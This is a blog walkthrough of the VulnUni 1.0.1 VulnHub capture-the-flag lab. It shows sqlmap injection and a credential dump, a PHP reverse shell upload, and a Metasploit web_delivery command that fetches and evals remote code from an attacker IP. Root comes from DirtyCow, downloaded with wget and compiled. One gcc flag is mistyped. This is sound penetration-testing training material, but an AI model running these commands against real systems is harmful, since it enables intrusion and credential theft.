@@ -1,0 +1,115 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">VulnUni: 1.0.1: Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/vulnuni-1-0-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-04-01T12:43:41+00:00">April 1, 2020</time><time class="updated" datetime="2025-06-10T20:10:37+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p>Hello! Everyone and Welcome to yet another CTF challenge from emaragkos, called ‘VulnUni: 1.0.1,’ which is available online on vulnhub for those who want to increase their skills in penetration testing and Black box testing.</p>
+<p><strong>Level:</strong> Easy</p>
+<p><strong>Task:</strong> Find user.txt and root.txt in the victim’s machine</p>
+<h3><span style="color: #800000;">Penetration Methodologies</span></h3>
+<p><strong>Scanning</strong></p>
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+<li><strong>Enumeration</strong></li>
+<li>Browsing HTTP service</li>
+<li>Extracting URLs through burpsuite spider</li>
+<li><strong>Exploitation</strong></li>
+<li>Using sqlmap to exploit SQL vulnerability</li>
+<li>Extracting User information using sqlmap</li>
+<li><strong>Privilege Escalation</strong></li>
+<li>Uploading php shell upload</li>
+<li>Using msfconsole web delivery to get a reverse shell</li>
+<li>Using DirtyCow to exploit kernel version</li>
+<li><strong>Capturing the flag</strong></li>
+</ul>
+<h3>Walkthrough</h3>
+<p>Let’s get started and pwn this machine!</p>
+<h3>Scanning</h3>
+<p>To identify our target, we will use <strong>netdiscover </strong>and our target IP is <strong>192.168.1.148</strong> as shown in the image below:</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-E8ANEvQeksk/XoSFhI1gi0I/AAAAAAAAjTg/2q5_sOsf2MMWuMzXqmUY5YPW00xKVY3bwCLcBGAsYHQ/s1600/1.png"/></p>
+<p>Let’s proceed further with Nmap to scan our target IP to find open ports if any. Use the following command to scan the IP:</p>
+<pre class="lang:default decode:true">nmap -A 192.168.1.148</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8S7CMd8nmpU/XoSFlKdj5wI/AAAAAAAAjUY/kdA-BjCAkWMpEl8EI2mtXqVwArMPHsumQCLcBGAsYHQ/s1600/2.png"/></p>
+<p>And as the result shows, port 80 is open with the service of HTTP.</p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p>As we are enumerating further, we open the target IP in the browser. The webpage that we came across was about the university.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-m19gEXHRvoE/XoSFl0fW_jI/AAAAAAAAjUg/O13Ab_1otEk6GRBPXVHqCSC0Di0ivUjbgCLcBGAsYHQ/s1600/3.png"/></p>
+<p>We couldn’t find anything useful here so we moved on and we started a Directory Bruteforce to enumerate the machine further. This gave us some directories and files namely contact, about, courses etc. But apart from this, there wasn’t anything useful here.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-TFjQfr_582I/XoSFl0mTZuI/AAAAAAAAjUo/jnAL_hKY10oOG0ABLURYCi6vDuur65KlACLcBGAsYHQ/s1600/4.png"/></p>
+<p>Then, I launched burpsuite and captured the request of the URL in the intercept tab as shown in the following image:</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Olb_WgCBdDY/XoSFmOOCQ4I/AAAAAAAAjUk/YzlemQXYXEAkyXLbYTKliGezsr1CLXNdwCLcBGAsYHQ/s1600/5.png"/></p>
+<p>Further, through the spider feature od burpsuite, we were able to find any URLs. Out of these, the E-Class URL was opened. Along with this, we also found the application version, i.e. 1.7.2, could be vulnerable and can be exploited. We made a note of this as it will be useful in further pwning of the lab.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-eDSBhbH51ls/XoSFmswIaHI/AAAAAAAAjUs/up8EoUa-WXwOKe3NbN0QtUY6f7lPbi_JACLcBGAsYHQ/s1600/6.png"/></p>
+<p>The directory e-class got us a login form. When tried to log in with default username and password, i.e. admin:admin, we successfully logged in.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-bziK7nuPklk/XoSFm1cHiPI/AAAAAAAAjUw/MfhMUBfRynA6OPZV7iArWISSkzUBoTmyQCLcBGAsYHQ/s1600/7.png"/></p>
+<p>But after logging in there was a Document Expired error and the URL was redirecting to Vulnuni.local as shown in the image below :</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-W4xZTKV2Sqo/XoSFnLt8iJI/AAAAAAAAjU0/EEIdx9AqVO0yH7utpRNhQkCwf6lge09QgCLcBGAsYHQ/s1600/8.png"/></p>
+<p>Therefore, we added the host to our /etc/hosts file just like in the image below :</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-IwQ3AcH0DPA/XoSFnTXjoFI/AAAAAAAAjU4/scownHuiATYwUNOAyX2YJmzyMf2gqdHsQCLcBGAsYHQ/s1600/9.png"/></p>
+<p>Earlier, we found that the application was using 1.7.2 version which is outdated. And after gathering open intelligence we found that the particular version of  vulnerable to the exploit which was available on exploit-db as shown in the image below :</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-__VfQrkgLbw/XoSFhVKhIXI/AAAAAAAAjTk/HDy81BCBeS48f8WxOmQJRgfwzCnYuhjBgCLcBGAsYHQ/s1600/10.png"/></p>
+<p>To use the exploit to our advantage, we needed to capture the request of the login page through burpsuite as shown in the image below :</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-GNP_YC06VXk/XoSFhSGspcI/AAAAAAAAjTo/G6TbuIo6HAEJ_ossW_RjF8goa0v0T5sIwCLcBGAsYHQ/s1600/11a.png"/></p>
+<p>After capturing the request, copy it to a text file and save file and save it as shown in the following image:</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-xMheqsCBZo4/XoSFiGPxUwI/AAAAAAAAjTs/qNrUuah12T0PKQeRvaosoyDUTYgz0JRGQCLcBGAsYHQ/s1600/11b.png"/></p>
+<p>Now, with the help of sqlmap we will inject our malicious query, with the help of the following command:</p>
+<pre class="lang:default decode:true">sqlmap -r vulnuni --dbs --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-EBS3sswW2-E/XoSFimj1dAI/AAAAAAAAjTw/ZdLTd3xqH74OzilWAy228FLuZBCHGpQ5QCLcBGAsYHQ/s1600/12a.png"/></p>
+<p>Executing the above command, lead us to find five databases in total, as shown in the image below, all we need now is to get credentials for anyone of the database.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ywS4SBg8g9I/XoSFinujppI/AAAAAAAAjT0/lZ30n-G1NK8nebWeLusXWNcjHNiLHWu4QCLcBGAsYHQ/s1600/12b.png"/></p>
+<p>As during the challenge, e-class directory proved to be of importance, we decided to get credentials of eclass first, hence the following command:</p>
+<pre class="lang:default decode:true">sqlmap -r vulnuni -D eclass -T user -C password --dump --batch</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-zg7_n9HcPcQ/XoSFi3WUcVI/AAAAAAAAjT4/1djJbdRL1bAkVVXb-J4IaYvBbWkYPTuhQCLcBGAsYHQ/s1600/13a.png"/></p>
+<p>We found a few passwords, as shown below, and tried to be by one to log in.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-VpGEq8gkEuY/XoSFjVepORI/AAAAAAAAjT8/RdU0RrROfPsk3wpYayi5Zhrs857Z4MZPwCLcBGAsYHQ/s1600/13b.png"/></p>
+<p>And soon we were successfully logged in as the password is <strong>ilikecats89 </strong>which you can also observe in the image below :</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-1MYncB8GXK4/XoSFjqjKzxI/AAAAAAAAjUA/foazCbF3UhcmBht8qu_u_sQtDBkalJkewCLcBGAsYHQ/s1600/14.png"/></p>
+<p>Upon traversing, we found a link through which we can upload our shell, the link is – http://vulnuni.local/vulnuni-eclass/modules/course_info/restore_course.php</p>
+<p>In order to upload our malicious file, we first downloaded <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php reverse shell</a> and changed IP and PORT to the local host and local port and the uploaded its the compressed version. You will find similar in the image below :</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ndOW9SXHE3M/XoSFj307d6I/AAAAAAAAjUE/CMCkE2X6M8UqRW7zppodPdTPmg3yQ22AwCLcBGAsYHQ/s1600/15.png"/></p>
+<p>After uploading shell, we started the netcat listener by using the following command:</p>
+<pre class="lang:default decode:true">sudo nc -nvlp 443</pre>
+<p><span style="color: #000000;">Then we simply access to PHP file we uploaded</span></p>
+<pre class="lang:default decode:true">http://vulnuni.local/courses/tmpUnzipping/phpshell.php</pre>
+<p>Once, the shell file is executed, we have our shell through netcat, as shown in the image below :</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-o0FUnej5SbE/XoSFkBErH-I/AAAAAAAAjUI/h-eXzbt8p0gPlMjGtQNSv-ARsICCV-ywQCLcBGAsYHQ/s1600/16.png"/></p>
+<p>But as it is not the best working environment, we are continuing with Metasploit’s “web delivery” Module to transfer our netcat session into a meterpreter one which will further provide us with more options. And for this, type:</p>
+<pre class="lang:default decode:true">use /exploit/multi/script/web_delivery
+set target 1
+set lhost 192.168.1.145
+set payload php/meterpreter/reverse_tcp
+set srvport 4445
+exploit</pre>
+<p>Note: To get meterpreter shell we sent the php -d allow_url_fopen =true -r “eval(file_get_contents(‘http://192.168.1.92/Oyd1Yv5lI’));” in terminal above.</p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-61ZHfGmwc4U/XoSFkbbsDFI/AAAAAAAAjUM/t4hFYDeEr_MBxI4bzVsa07LCD9HrPohNACLcBGAsYHQ/s1600/17.png"/></p>
+<p>To upgrade the shell into TTY shell which is more powerful. For this conversion of shell use the following command:</p>
+<pre class="lang:default decode:true">python -c 'import pty;pty.spawn("/bin/bash")'</pre>
+<p>After getting the TTY shell, we navigated through many directories and we found user flag in the home directory with the help of following commands:</p>
+<pre class="lang:default decode:true">cd /home
+ls
+cd vuluni
+cat flag.txt</pre>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p>We will use the following command to we get the kernel version of the target machine.</p>
+<pre class="lang:default decode:true">uname -r</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-jDrKlkap9Gk/XoSFksOSqrI/AAAAAAAAjUQ/hQdFscN2z08Rn5amTKHmU4oqqvTeMaBgACLcBGAsYHQ/s1600/18.png"/></p>
+<p>Then through OSINT, we found that kernel was vulnerable to <a href="https://www.exploit-db.com/exploits/40616">DirtyCow</a>. Therefore, we downloaded the exploit to our local machine and saved it in <strong>/var/www/http</strong> and then started the apache server on port 80. Further, we moved the dirtycow.c file to the /tmp directory of the target by using the following commands:</p>
+<pre class="lang:default decode:true ">cd /tmp
+wget http://192.168.1.145/dirtycow.c</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-nwqIBvW1eCI/XoSFk6JUn5I/AAAAAAAAjUU/fCIhmKBHtBwiNaV9jl3tsKYqmp8X_B6pQCLcBGAsYHQ/s1600/19.png"/></p>
+<p>Now, compile the exploit’s c language file to executable binary file using the following command along with giving it permissions as following:</p>
+<pre class="lang:default decode:true">gcc dirtycow.c -0 root -pthread
+./root
+cd /root
+ls
+cat flag.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-LhkT9U9wzWY/XoSFlSDWdWI/AAAAAAAAjUc/US6NGOCqHVk1MCDaN0ghd5XzDcjXmBb-wCLcBGAsYHQ/s1600/20.png"/></p>
+<p>And voila!! We have successfully rooted the lab.</p>
+<p><span style="color: #000000;"><strong>Author: Prabhjot Dunglay</strong> is a Cyber Security Enthusiast with 2 years of experience in Penetration Testing at Hacking Articles. Contac</span>t <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/prabhjotdunglay">here</a></strong></span>.</p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
